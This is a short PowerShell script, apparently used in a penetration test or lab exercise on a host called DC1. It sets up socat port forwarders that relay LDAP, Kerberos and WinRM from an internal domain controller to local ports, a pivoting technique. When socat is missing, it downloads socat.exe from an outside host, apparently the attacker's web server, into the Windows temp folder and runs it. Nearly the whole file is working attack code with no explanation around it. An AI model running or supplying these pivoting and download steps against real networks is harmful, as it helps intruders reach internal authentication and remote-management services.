# Using socat if available on DC1
Write-Host "Checking for socat..."

# Check if socat is available
$socatPath = Get-Command socat -ErrorAction SilentlyContinue
if ($socatPath) {
    Write-Host "Found socat at $($socatPath.Source)"
    
    # Start socat forwarders in background
    Start-Job -ScriptBlock {
        socat TCP-LISTEN:33389,fork,reuseaddr TCP:192.168.2.2:389
    }
    Write-Host "Started LDAP forwarder on port 33389"
    
    Start-Job -ScriptBlock {
        socat TCP-LISTEN:30088,fork,reuseaddr TCP:192.168.2.2:88
    }
    Write-Host "Started Kerberos forwarder on port 30088"
    
    Start-Job -ScriptBlock {
        socat TCP-LISTEN:35985,fork,reuseaddr TCP:192.168.2.2:5985
    }
    Write-Host "Started WinRM forwarder on port 35985"
    
} else {
    Write-Host "socat not found, trying to download..."
    
    # Try to download socat for Windows
    try {
        Invoke-WebRequest -Uri "http://10.10.17.28:8000/socat.exe" -OutFile "C:\Windows\Temp\socat.exe" -TimeoutSec 30
        Write-Host "socat downloaded successfully"
        
        # Start forwarders
        Start-Job -ScriptBlock {
            & "C:\Windows\Temp\socat.exe" TCP-LISTEN:33389,fork,reuseaddr TCP:192.168.2.2:389
        }
        Write-Host "Started LDAP forwarder on port 33389"
        
    } catch {
        Write-Host "Failed to download socat: $($_.Exception.Message)"
    }
}
